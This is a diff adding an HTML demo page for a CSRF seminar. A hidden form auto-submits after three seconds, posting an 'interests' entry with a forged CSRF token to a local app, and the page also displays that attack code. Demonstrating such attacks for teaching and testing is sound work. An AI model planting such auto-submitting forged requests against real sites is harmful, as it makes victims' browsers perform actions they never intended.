@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>CSRF seminar - add interest tentative</title>
+    </head>
+
+    <body>
+        <p><a href="index.html" title="Menu">Back to menu</a><br /></p>
+        <p>
+        POST HTTP "invisible" request in <span id="timer">3</span> seconds:</p>
+        <form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=interests&action=add">
+            <input type="hidden" name="name" value="bad things" />
+            <input type="hidden" name="description" value="" />
+            <input type="hidden" name="csrf_token" value="token$signed_token" />
+        </form>
+        <script type="text/javascript">
+            var timer = 3; // 3 seconds
+            var updateId = setInterval(function() {
+                timer--; // remove 1 second
+                document.getElementById("timer").innerHTML = timer; // update HTML
+            }, 1000); // each second
+            setTimeout(function() {
+                clearInterval(updateId); // remove HTML update
+                document.hackForm.submit(); // submit form
+            }, 3000);
+        </script>
+        <br />
+        <br />
+        <hr />
+        Code:<br />
+        <code>
+        &lt;form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=interests&amp;action=add"&gt;<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" <span style="color:red;">name="name" value="bad things"</span>&gt;<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="description" value="" /&gt;<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" <span style="color:red;">name="csrf_token" value="token$signed_token"</span>&gt;<br />
+        &lt;/form&gt;<br />
+        &lt;script type="text/javascript"&gt;document.hackForm.submit();&lt;/script&gt;<br />
+        </code>
+    </body>
+</html>
